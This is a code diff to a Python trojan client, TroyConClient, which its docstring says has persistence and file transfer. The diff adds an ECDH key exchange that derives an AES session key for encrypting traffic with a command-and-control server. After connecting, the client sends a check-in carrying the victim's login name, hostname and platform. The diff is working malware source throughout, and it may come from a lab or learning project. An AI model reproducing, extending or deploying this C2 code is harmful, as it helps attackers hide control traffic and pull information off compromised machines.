@@ -12,8 +12,9 @@ from .constants import (RECONNECTION_DELAY_SECONDS)
 # Needed when registering in the registry
 # from winreg import SetValueEx, CreateKey, HKEY_CURRENT_USER, REG_SZ
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding, serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import padding
 
 class TroyConClient:
     """
@@ -27,7 +28,7 @@ class TroyConClient:
     - Includes file upload and download capabilities.
     """
 
-    def __init__(self, server_ip: str, server_port: int, aes_key: bytes, test_dir: str = None, persistence_dir: str = None):
+    def __init__(self, server_ip: str, server_port: int, test_dir: str = None, persistence_dir: str = None):
         """
         Client initialization method
 
@@ -43,7 +44,7 @@ class TroyConClient:
         """
         self.server_ip = server_ip
         self.server_port = server_port
-        self.aes_key = aes_key
+        self.aes_key = None  # AES symmetric key will be established after ECDH handshake
         self.c2_socket = None  # Socket object for connection with the C2 server
 
         # Set and change to the test directory
@@ -58,6 +59,74 @@ class TroyConClient:
                 print(f"[Error] Failed to set working directory '{self.test_dir}': {e}. Program will terminate.")
                 sys.exit(1)
 
+    # -------------------- ECDH Key Exchange (Handshake) --------------------
+    def _perform_handshake(self, sock: socket.socket):
+        """
+        Perform an ECDH handshake with the server over the given socket.
+
+        This method exchanges elliptic-curve public keys with the server using the 
+        SECP256K1 curve, computes a shared secret through ECDH (Elliptic Curve Diffie-Hellman),
+        and derives a 256-bit AES session key using SHA-256. The resulting symmetric key 
+        is stored internally and used to encrypt and decrypt further communication.
+
+        Process:
+            1. Receive the server's public key (prefixed with 4-byte length).
+            2. Generate client's ECDH key pair (private + public).
+            3. Compute the shared secret using ECDH with the received public key.
+            4. Derive a 32-byte AES key by hashing the shared secret using SHA-256.
+            5. Send the client public key back to the server in uncompressed form.
+
+        Successful execution means both client and server independently derive 
+        an identical AES session key without directly transmitting it over the network.
+
+        Returns:
+            bool: True if the handshake completes successfully and AES key is generated, 
+                False if an error occurs during the process.
+        """
+
+        print("[Handshake] Starting ECDH Key Exchange...")
+
+        try:
+            # Receive server public key (4-byte length prefix + key bytes)
+            len_bytes = sock.recv(4)
+            if not len_bytes: return False
+            server_pub_len = int.from_bytes(len_bytes, 'big')
+            server_pub_bytes = sock.recv(server_pub_len)
+
+            # Generate client ECDH key pair (SECP256K1)
+            client_private_key = ec.generate_private_key(ec.SECP256K1(), default_backend())
+            client_public_key = client_private_key.public_key()
+
+            # Load server public key and compute shared secret (ECDH)
+            server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
+                ec.SECP256K1(), server_pub_bytes
+            )
+            shared_secret = client_private_key.exchange(ec.ECDH(), server_public_key)
+            print(f"[Handshake] Shared Secret: {shared_secret.hex()}")
+
+            # Derive 32-byte AES session key using SHA-256 hash of shared secret
+            digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+            digest.update(shared_secret)
+            self.aes_key = digest.finalize()
+            print(f"[Handshake] AES Key (256-bit): {self.aes_key.hex()}")
+
+            # Send client public key to server (Uncompressed format)
+            client_pub_bytes = client_public_key.public_bytes(
+                encoding=serialization.Encoding.X962,
+                format=serialization.PublicFormat.UncompressedPoint
+            )
+            
+            # Send 4-byte length prefix followed by public key
+            sock.sendall(len(client_pub_bytes).to_bytes(4, 'big'))
+            sock.sendall(client_pub_bytes)
+
+            print(f"[Handshake] Keys exchanged successfully. AES Key derived.")
+            return True
+
+        except Exception as e:
+            print(f"[Handshake Error] {e}")
+            return False
+
     # -------------------- Encryption and Decryption Methods (using cryptography) --------------------
     def _encrypt_data(self, data: bytes) -> bytes:
         """
@@ -67,7 +136,9 @@ class TroyConClient:
         :param data: Original data to encrypt (bytes)
         :return: Concatenation of IV (16 bytes) and encrypted data (bytes)
         """
-
+        
+        if not self.aes_key: raise ValueError("AES Key not established yet.")
+        
         iv = os.urandom(16)
         
         # Apply PKCS7 padding
@@ -92,6 +163,8 @@ class TroyConClient:
         :param data: Received data (IV + ciphertext)
         :return: Decrypted original data (bytes)
         """
+
+        if not self.aes_key: raise ValueError("AES Key not established yet.")
 
         iv = data[:16]
         ciphertext = data[16:]
@@ -458,6 +531,12 @@ class TroyConClient:
                 self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.c2_socket.connect((self.server_ip, self.server_port))
                 print(f"[C2 Comm] Connected to C2 server ({self.server_ip}:{self.server_port}) successfully!")
+
+                if not self._perform_handshake(self.c2_socket):
+                    print("[!] Handshake failed. Retrying...")
+                    self.c2_socket.close()
+                    time.sleep(RECONNECTION_DELAY_SECONDS)
+                    continue
 
                 initial_check_in_message = f"CHECK_IN:{os.getlogin()}:{socket.gethostname()}:{sys.platform}".encode('utf-8')
                 self._send_data_with_length_prefix(self.c2_socket, initial_check_in_message, "Initial check-in message")
